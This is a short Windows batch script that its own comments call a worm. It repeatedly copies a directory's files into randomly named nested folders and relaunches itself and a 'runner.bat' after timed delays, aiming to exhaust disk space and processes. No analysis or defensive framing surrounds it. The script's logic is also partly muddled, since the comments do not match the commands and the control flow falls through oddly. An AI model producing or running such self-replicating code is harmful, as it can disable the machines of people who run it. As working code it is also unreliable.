@echo off

REM Get the source directory
set sourceDirectory=%1

REM Check if the directory exists
if not exist "%sourceDirectory%" (
  pause
  exit
)

REM Create a random directory path
set destinationDirectory=%random%\%random%

REM Check if the destination directory doesn't exist
if exist "%destinationDirectory%" (
  goto :makeNewDirectory
)

REM Move the current process to the destination directory
md "%destinationDirectory%"

REM Copy all of the files in the source directory to the destination directory
for /f "tokens=* delims=" %%a in ('dir /b "%sourceDirectory%\*.*"') do (
  xcopy /q "%sourceDirectory%\%%a" "%destinationDirectory%\"
)

REM Start the current process again
start /b "" "%0%"

:makeNewDirectory
REM Make a new random directory path
set destinationDirectory=%random%\%random%

REM Check if the destination directory doesn't exist
if exist "%destinationDirectory%" (
  goto :makeNewDirectory
)

REM Move the current process to the destination directory
md "%destinationDirectory%"

REM Copy all of the files in the source directory to the destination directory
for /f "tokens=* delims=" %%a in ('dir /b "%sourceDirectory%\*.*"') do (
  xcopy /q "%sourceDirectory%\%%a" "%destinationDirectory%\"
)

REM Start the current process again after 30 seconds
ping -n 31 localhost > nul
start /b runner.bat

REM Start a backup set of the worm after 10 minutes
ping -n 601 localhost > nul
start /b runner.bat
